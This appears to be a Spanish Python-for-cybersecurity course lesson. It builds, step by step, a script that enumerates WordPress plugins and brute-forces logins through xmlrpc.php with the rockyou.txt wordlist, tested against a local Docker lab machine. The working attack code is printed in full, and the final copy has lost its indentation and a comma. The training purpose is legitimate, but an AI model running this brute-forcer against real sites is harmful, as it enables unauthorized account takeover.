¡Muy buenas a todos! Bienvenidos una vez más al curso de Python aplicado a la ciberseguridad. En esta ocasión, vamos a desarrollar paso a paso una herramienta unificada en Python que combine dos técnicas que hemos aprendido en clases anteriores: la enumeración de plugins de WordPress y el ataque de fuerza bruta contra el archivo `xmlrpc.php` de WordPress. El objetivo es crear un solo script que permita al usuario elegir entre estas dos tareas mediante una interfaz simple. A continuación, te explico todo el proceso de manera detallada, coherente y sin omitir ningún paso, para que quede clarísimo cómo llegamos al resultado final.

---

### **Paso 1: Configuración del entorno con una máquina vulnerable**
Antes de escribir el código, necesitamos un entorno donde probar nuestra herramienta. Para ello, utilizamos una máquina vulnerable de la plataforma **Docker Labs**, específicamente la máquina llamada **"Escolares"**. Esta máquina es ideal porque tiene un plugin de WordPress instalado y también es susceptible a ataques de fuerza bruta contra el archivo `xmlrpc.php`. Vamos a configurarla:

1. **Descarga de la máquina**:
   - Accedemos al enlace de descarga (por ejemplo, en Mega) haciendo clic en "Descargar" o "Download".
   - Obtenemos un archivo comprimido llamado `escolares.zip`.

2. **Extracción del contenido**:
   - Abrimos el archivo `escolares.zip` y extraemos su contenido en el escritorio.
   - Dentro encontramos un archivo llamado `escolares.tar`, que es el que usaremos para desplegar la máquina.

3. **Despliegue de la máquina con Docker**:
   - Abrimos una terminal en el escritorio (donde está `escolares.tar`).
   - Ejecutamos el comando:  
     ```bash
     sudo bash autodeploy escolares.tar
     ```
   - Introducimos la contraseña de nuestro usuario cuando se nos solicita.
   - Esto despliega la máquina vulnerable en Docker, asignándole una IP (en este caso, asumimos que es `172.17.0.2`, como se verá más adelante en el código).

Con la máquina en marcha, ya tenemos el entorno listo para probar nuestro script.

---

### **Paso 2: Estructura inicial del código**
Ahora pasamos a crear el script en Python. La idea es combinar dos scripts previos: uno para enumerar plugins y otro para realizar ataques de fuerza bruta. Vamos a organizarlos en funciones y añadir una opción para que el usuario elija qué tarea ejecutar. Abrimos nuestro editor de código favorito y comenzamos.

#### **Librería necesaria**
Primero, importamos la librería `requests`, que usaremos para hacer peticiones HTTP:
```python
import requests
```

---

### **Paso 3: Crear la función para enumerar plugins (`ataque_plugin`)**
Empezamos con la enumeración de plugins, que ya habíamos trabajado en clases anteriores. El código original consistía en una tupla con nombres de plugins comunes y un bucle que verificaba si cada plugin existía en el sitio objetivo. Ahora lo encapsulamos en una función llamada `ataque_plugin()`.

1. **Definición de la función y lista de plugins**:
   - Creamos la función:
     ```python
     def ataque_plugin():
     ```
   - Dentro de la función, definimos una tupla con una lista extensa de plugins comunes de WordPress (por ejemplo, `jetpack`, `akismet`, etc.). Aquí está un extracto de cómo se ve:
     ```python
     plugins = (
         "jetpack",
         "akismet",
         "contact-form-7",
         "woocommerce",
         "wordfence",
         # ... muchos más plugins ...
         "wp-optimize-premium"
     )
     ```

2. **URL base**:
   - Definimos la URL base del sitio WordPress donde están los plugins. En este caso, como la máquina "Escolares" tiene WordPress instalado en el subdirectorio `/wordpress/`, usamos:
     ```python
     base_url = "http://172.17.0.2/wordpress/wp-content/plugins/"
     ```

3. **Función auxiliar para verificar plugins**:
   - Creamos una función interna llamada `check_plugin()` que toma el nombre de un plugin como parámetro y verifica si existe:
     ```python
     def check_plugin(plugin):
         url = f"{base_url}{plugin}/readme.txt"
         response = requests.get(url)
         if response.status_code == 200:
             print(f"[+] Plugin encontrado: {plugin}")
             print(f"Debes insertar esta url: {base_url}{plugin}/readme.txt")
         else:
             pass
     ```
   - Esto intenta acceder al archivo `readme.txt` de cada plugin (un archivo típico en plugins de WordPress). Si el código de estado es `200`, significa que el plugin existe.

4. **Bucle para iterar sobre los plugins**:
   - Añadimos un bucle dentro de `ataque_plugin()` que recorre cada plugin de la tupla y llama a `check_plugin()`:
     ```python
     for plugin in plugins:
         check_plugin(plugin)
     ```

**Nota inicial**: Al principio, podríamos haber olvidado incluir el subdirectorio `/wordpress/` en la URL base (por ejemplo, usando solo `http://172.17.0.2/wp-content/plugins/`), lo que habría hecho que la enumeración fallara. Más adelante corregiremos esto tras probar el script.

---

### **Paso 4: Crear la función para fuerza bruta (`bruteforce`)**
Ahora implementamos la función para el ataque de fuerza bruta contra `xmlrpc.php`, basada en un script previo.

1. **Definición de la función**:
   - Creamos la función:
     ```python
     def bruteforce():
     ```

2. **Configuración inicial**:
   - Definimos la URL objetivo (el archivo `xmlrpc.php` de la máquina vulnerable), el usuario a atacar y el diccionario de contraseñas:
     ```python
     url = 'http://172.17.0.2/wordpress/xmlrpc.php'
     usuario = 'luisillo'
     contraseña = 'rockyou.txt'
     ```

3. **Carga del diccionario**:
   - Abrimos el archivo `rockyou.txt` (un diccionario famoso de contraseñas) y leemos sus líneas:
     ```python
     with open(contraseña, 'r', encoding='latin-1') as diccionario:
         passwords = diccionario.readlines()
     ```
   - Usamos `encoding='latin-1'` para evitar errores con caracteres especiales en el archivo.

4. **Bucle de fuerza bruta**:
   - Iteramos sobre cada contraseña, limpiándola de espacios con `.strip()`, y construimos un payload XML para el método `wp.getUsersBlogs`:
     ```python
     for password in passwords:
         password = password.strip()

         payload = f"""
         <?xml version="1.0" encoding="UTF-8"?>
         <methodCall>
         <methodName>wp.getUsersBlogs</methodName>
         <params>
         <param><value>{usuario}</value></param>
         <param><value>{password}</value></param>
         </params>
         </methodCall>"""
     ```
   - Enviamos el payload mediante una petición POST y verificamos la respuesta:
     ```python
     print(f"Probamos con la contraseña {password}")
     respuesta = requests.post(url, data=payload)
     if 'incorrectos.' not in respuesta.text:
         print(f"La contraseña del usuario {usuario} es {password}")
         exit(0)
     ```
   - Si la palabra "incorrectos" no está en la respuesta, asumimos que la contraseña es correcta y terminamos el script con `exit(0)`.

**Preparación del diccionario**:
- Descargamos `rockyou.txt` de internet (por ejemplo, buscándolo en Google) y lo movemos al escritorio, donde está nuestro script, para que el código pueda encontrarlo.

---

### **Paso 5: Interfaz de usuario para elegir la tarea**
Ya tenemos las dos funciones. Ahora añadimos una forma de que el usuario elija qué hacer.

1. **Solicitud de entrada**:
   - Creamos una variable `choice` usando `input()`:
     ```python
     choice = input("Introduce 1 para hacer fuerza bruta o 2 para enumerar plugins: ")
     ```

2. **Condicionales para ejecutar las funciones**:
   - Usamos un `if-elif-else` para llamar a la función correspondiente:
     ```python
     if choice == '1':
         bruteforce()
     elif choice == '2':
         ataque_plugin()
     else:
         print("Opción no válida, introduce un 1 o un 2")
     ```
   - Añadimos dos puntos y un espacio en el mensaje del `input` para que sea más legible (un detalle estético que corregimos tras la primera prueba).

---

### **Paso 6: Primera prueba del script**
Guardamos el script como `script.py` y lo ejecutamos desde la terminal:
```bash
python3 script.py
```

#### **Prueba con fuerza bruta (opción 1)**:
- Introducimos `1` y presionamos Enter.
- El script comienza a probar contraseñas del diccionario `rockyou.txt`.
- Observamos que funciona, pero no encuentra la contraseña correcta (`LUIS1981`) porque no está en `rockyou.txt` por defecto.

**Corrección**:
- Abrimos `rockyou.txt` en un editor de texto.
- Añadimos manualmente la línea `LUIS1981` al archivo y guardamos.
- Volvemos a ejecutar:
  ```bash
  python3 script.py
  ```
- Elegimos `1` otra vez.
- Esta vez, el script encuentra la contraseña y muestra:
  ```
  Probamos con la contraseña LUIS1981
  La contraseña del usuario luisillo es LUIS1981
  ```

#### **Prueba con enumeración de plugins (opción 2)**:
- Ejecutamos de nuevo:
  ```bash
  python3 script.py
  ```
- Introducimos `2`.
- El script no encuentra ningún plugin. Algo falla.

**Depuración**:
- Revisamos la función `ataque_plugin()` y nos damos cuenta de que la URL base (`http://172.17.0.2/wp-content/plugins/`) no incluye el subdirectorio `/wordpress/`, donde está instalado WordPress en esta máquina.
- Corregimos la URL base a:
  ```python
  base_url = "http://172.17.0.2/wordpress/wp-content/plugins/"
  ```
- Volvemos a ejecutar con la opción `2`.
- Ahora sí funciona y muestra, por ejemplo:
  ```
  [+] Plugin encontrado: akismet
  Debes insertar esta url: http://172.17.0.2/wordpress/wp-content/plugins/akismet/readme.txt
  ```
- Copiamos la URL en el navegador y confirmamos que el plugin `akismet` existe, viendo detalles como su versión.

---

### **Paso 7: Código final completo**
Aquí está el script completo tras todas las correcciones:

```python
import requests

def ataque_plugin():
    plugins = (
        "jetpack", "akismet", "contact-form-7", "woocommerce", "wordfence",
        # ... lista completa de plugins ...
        "wp-optimize-premium"
    )
    base_url = "http://172.17.0.2/wordpress/wp-content/plugins/"
    
    def check_plugin(plugin):
        url = f"{base_url}{plugin}/readme.txt"
        response = requests.get(url)
        if response.status_code == 200:
            print(f"[+] Plugin encontrado: {plugin}")
            print(f"Debes insertar esta url: {base_url}{plugin}/readme.txt")
        else:
            pass
    
    for plugin in plugins:
        check_plugin(plugin)

def bruteforce():
    url = 'http://172.17.0.2/wordpress/xmlrpc.php'
    usuario = 'luisillo'
    contraseña = 'rockyou.txt'
    
    with open(contraseña, 'r', encoding='latin-1') as diccionario:
        passwords = diccionario.readlines()
    
    for password in passwords:
        password = password.strip()
        payload = f"""
        <?xml version="1.0" encoding="UTF-8"?>
        <methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
        <param><value>{usuario}</value></param>
        <param><value>{password}</value></param>
        </params>
        </methodCall>"""
        print(f"Probamos con la contraseña {password}")
        respuesta = requests.post(url, data=payload)
        if 'incorrectos.' not in respuesta.text:
            print(f"La contraseña del usuario {usuario} es {password}")
            exit(0)

choice = input("Introduce 1 para hacer fuerza bruta o 2 para enumerar plugins: ")
if choice == '1':
    bruteforce()
elif choice == '2':
    ataque_plugin()
else:
    print("Opción no válida, introduce un 1 o un 2")
```

---

### **Paso 8: Reflexión y conclusión**
El script final cumple el objetivo: combina dos técnicas en una herramienta unificada. Las funciones en Python nos permiten organizar el código y ejecutar tareas específicas según la elección del usuario. Algunos puntos clave:
- **Ajustes necesarios**: Tuvimos que corregir la URL base para la enumeración de plugins y añadir manualmente la contraseña al diccionario.
- **Flexibilidad**: El uso de funciones hace que el código sea modular y fácil de ampliar.
- **Mejoras posibles**: Podríamos añadir más opciones, mejorar la interfaz o optimizar el ataque de fuerza bruta.
## Codigo Completo:

````python
import requests

  

def ataque_plugin():

plugins = (

"jetpack",

"akismet",

"contact-form-7",

"woocommerce",

"wordfence",

"yoast-seo",

"elementor",

"w3-total-cache",

"updraftplus",

"wpforms",

"all-in-one-seo-pack",

"google-analytics-for-wordpress",

"really-simple-ssl",

"wordfence-security",

"classic-editor",

"disable-comments",

"smush",

"mailchimp-for-wp",

"redirection",

"shortpixel-image-optimizer",

"duplicate-post",

"monsterinsights",

"tablepress",

"ninja-forms",

"wp-optimize",

"broken-link-checker",

"cookie-notice",

"advanced-custom-fields",

"the-events-calendar",

"easy-wp-smtp",

"seo-press",

"elementor-pro",

"rank-math",

"wp-rocket",

"bbpress",

"buddypress",

"wp-super-cache",

"mailpoet",

"yoast-seo-premium",

"ultimate-member",

"woocommerce-subscriptions",

"wp-job-manager",

"regenerate-thumbnails",

"revslider",

"revive-old-post",

"wp-fastest-cache",

"simple-301-redirects",

"wordfence-login-security",

"wp-smush-pro",

"ithemes-security",

"nextgen-gallery",

"wp-migrate-db",

"duplicator",

"really-simple-captcha",

"autoptimize",

"social-media-widget",

"add-to-any",

"disqus-comment-system",

"broken-link-manager",

"pretty-link",

"simple-tags",

"advanced-excerpt",

"better-click-to-tweet",

"wp-polls",

"wordpress-popular-posts",

"ad-inserter",

"wp-mail-smtp",

"easy-digital-downloads",

"give",

"loco-translate",

"bbpress",

"buddypress",

"sucuri-scanner",

"envira-gallery",

"soliloquy",

"my-calendar",

"wp-google-maps",

"custom-post-type-ui",

"members",

"query-monitor",

"theme-check",

"user-role-editor",

"woocommerce-gateway-stripe",

"woocommerce-services",

"yith-woocommerce-wishlist",

"yith-woocommerce-compare",

"simple-share-buttons-adder",

"the-events-calendar-pro",

"under-construction-page",

"wp-optimize-premium",

"backupbuddy",

"wp-all-import",

"wp-offload-media",

"wp-all-export",

"ultimate-social-media-icons",

"real-cookie-banner",

"litespeed-cache",

"loginizer",

"under-construction",

"wp-maintenance-mode",

"hummingbird-performance",

"push-engage",

"easy-social-share-buttons",

"post-smtp",

"advanced-custom-fields-pro",

"google-site-kit",

"amp",

"autoptimize",

"better-wp-security",

"blubrry-powerpress",

"contact-form-7-datepicker",

"easy-affiliate-links",

"easy-theme-and-plugin-upgrades",

"insert-headers-and-footers",

"mc4wp-mailchimp-for-wordpress",

"post-types-order",

"restrict-content-pro",

"simple-history",

"simple-local-avatars",

"simple-sitemap",

"simple-social-icons",

"smush-pro",

"social-icons-widget-by-wpzoom",

"the-events-calendar-shortcode",

"the-seo-framework",

"updraftplus-premium",

"wp-cfm",

"wp-rollback",

"wp-user-avatar",

"wp-user-frontend",

"yith-woocommerce-ajax-search",

"yith-woocommerce-ajax-product-filter",

"yith-woocommerce-quick-view",

"yith-woocommerce-request-a-quote",

"yith-woocommerce-catalog-mode",

"yith-woocommerce-badge-management",

"yith-woocommerce-compare",

"yith-woocommerce-featured-video",

"yith-woocommerce-questions-and-answers",

"yith-woocommerce-product-bundles",

"yith-woocommerce-product-gallery-magnifier",

"yith-woocommerce-tab-manager",

"yith-woocommerce-wishlist",

"yoast-comment-hacks",

"wordfence-central",

"wp-mail-bank",

"wp-multibyte-patch",

"wp-photo-album-plus",

"wp-postratings",

"wp-recipe-maker",

"wp-review",

"wp-simple-firewall",

"wp-staging",

"wp-statistics",

"wp-super-cache",

"wp-to-buffer",

"wp-to-twitter",

"wp-tune-up",

"wp-ulike",

"wp-useronline",

"wp-webhooks",

"wp-whatsapp-button",

"wp-whatsapp-chat",

"wp-wpbakery-page-builder",

"wpcf7-mailchimp-extension",

"wpcf7-redirect",

"wpcf7-recaptcha",

"wpcf7-submission",

"wpcf7-to-database-extension",

"wpcf7-wpml",

"wpeverest-user-registration",

"wpforms-constant-contact",

"wpforms-drip",

"wpforms-form-abandonment",

"wpforms-mailchimp",

"wpforms-marketing-campaigns",

"wpforms-uploads",

"wpml-translation-management",

"wp-offload-s3",

"wp-offload-ses",

"wpmudev-upfront-builder",

"wpmudev-snapshot",

"wpmudev-smartcrawl",

"wpmudev-marketpress",

"wpmudev-bp-activity",

"wpmudev-bp-group-calendar",

"wpmudev-bp-group-documents",

"wpmudev-bp-group-email",

"wpmudev-bp-group-hierarchy",

"wpmudev-bp-group-organizer",

"wpmudev-bp-groupblog",

"wpmudev-bp-links",

"wpmudev-bp-livestream",

"wpmudev-bp-lockdown",

"wpmudev-bp-mass-messaging",

"wpmudev-bp-polls",

"wpmudev-bp-privacy",

"wpmudev-bp-simple-events",

"wpmudev-bp-social",

"wpmudev-bp-social-media",

"wpmudev-bp-translate",

"wpmudev-bp-twitter",

"wpmudev-bp-user-profile-completion",

"wpmudev-bp-user-profile-fields",

"wpmudev-bp-user-profile-visibility",

"wpmudev-bp-user-status",

"wpmudev-bp-xprofile-custom-fields",

"wpmudev-coursepress",

"wpmudev-dashboard",

"wpmudev-defender",

"wpmudev-domain-mapping",

"wpmudev-edd-pushover",

"wpmudev-e-newsletter",

"wpmudev-events-plus",

"wpmudev-facebook",

"wpmudev-friends",

"wpmudev-gridbuilder",

"wpmudev-hivepress",

"wpmudev-hummingbird",

"wpmudev-infinite-sessions",

"wpmudev-login-safety",

"wpmudev-membership",

"wpmudev-membership-premium",

"wpmudev-membership-ultimate",

"wpmudev-membership2",

"wpmudev-multisite-privacy",

"wpmudev-pro-sites",

"wpmudev-qa",

"wpmudev-qtranslate-x",

"wpmudev-reports",

"wpmudev-saml",

"wpmudev-saml-service-provider",

"wpmudev-simple-css",

"wpmudev-single-sign-on",

"wpmudev-smartsso",

"wpmudev-support",

"wpmudev-support-system",

"wpmudev-tips",

"wpmudev-tutoring",

"wpmudev-unlimited-smtp",

"wpmudev-upfront",

"wpmudev-upfront-contact",

"wpmudev-upfront-media",

"wpmudev-upfront-parallax",

"wpmudev-upfront-portfolio",

"wpmudev-upfront-posts",

"wpmudev-upfront-starter",

"wpmudev-upfront-studio",

"wpmudev-upfront-symbiostock",

"wpmudev-upfront-widgets",

"wpmudev-user-blogs",

"wpmudev-widgets-for-sitebuilder",

"wpmudev-wp-blogandplugin",

"wpmudev-wp-user-control",

"wpmudev-wp-usercontrol",

"wpmudev-wpmudev",

"wpmudev-wunderplugin",

"wp-optimize-premium"

"revslider",

"visual-composer",

"wp-statistics",

"userpro",

"gravityforms",

"all-in-one-wp-migration",

"duplicator",

"wpfastestcache",

"ninja-forms",

"wordfence",

"wp-file-manager",

"file-manager",

"file-manager-advanced",

"download-manager",

"wp-easycart",

"wp-ultimate-csv-importer",

"wp-job-manager",

"wpdiscuz",

"wordfence",

"formidable",

"brizy",

"site-editor",

"wpdatatables",

"members",

"real-estate-7",

"wp-mail-smtp",

"woo-gutenberg-products-block",

"essential-addons-for-elementor-lite",

"paid-memberships-pro",

"wp-customer-area",

"slider-hero",

"simple-301-redirects",

"yith-woocommerce-gift-cards",

"wpmu-dev-facebook",

"wpmu-dev-chat",

"wpmu-dev-defender",

"wpmu-dev-dashboard",

"wpmu-dev-forminator",

"wpmu-dev-membership-2",

"wpmu-dev-hummingbird",

"wpmu-dev-ibbu",

"wpmu-dev-mailchimp",

"wpmu-dev-snapshot",

"wpmu-dev-support",

"wpmu-dev-upfront",

"wpmu-dev-vc-templating",

"wpmu-dev-videopress",

"wpmu-dev-wp-forminator"

)

  

# URL base

base_url = "http://172.17.0.2/wordpress/wp-content/plugins/"

  

def check_plugin(plugin):

url = f"{base_url}{plugin}/readme.txt"

response = requests.get(url)

if response.status_code == 200:

print(f"[+] Plugin encontrado: {plugin}")

print(f"Debes insertar esta url: {base_url}{plugin}/readme.txt") #lo termino despues...

else:

pass

  

# Iterar sobre cada plugin para ver si existe (Si existe lo envía a la función)

for plugin in plugins:

check_plugin(plugin)

  

def bruteforce():

url = 'http://172.17.0.2/wordpress/xmlrpc.php'

usuario = 'luisillo'

contraseña = 'rockyou.txt'

  

with open(contraseña, 'r', encoding='latin-1') as diccionario:

passwords = diccionario.readlines()

  

for password in passwords:

password = password.strip()

  

payload = f"""

<?xml version="1.0" encoding="UTF-8"?>

<methodCall>

<methodName>wp.getUsersBlogs</methodName>

<params>

<param><value>{usuario}</value></param>

<param><value>{password}</value></param>

</params>

</methodCall>"""

  

print(f"Probamos con la contraseña {password}")

  

respuesta = requests.post(url, data=payload)

  

if 'incorrectos.' not in respuesta.text:

print(f"La contraseña del usuario {usuario} es {password}")

exit(0)

  

choice = input("Introduce 1 para hacer fuerza bruta o 2 para enumerar plugins ")

  

if choice == '1':

bruteforce()

  

elif choice == '2':

ataque_plugin()

  

else:

print("Opcion no valida, Introduce un 1 o 2")
`````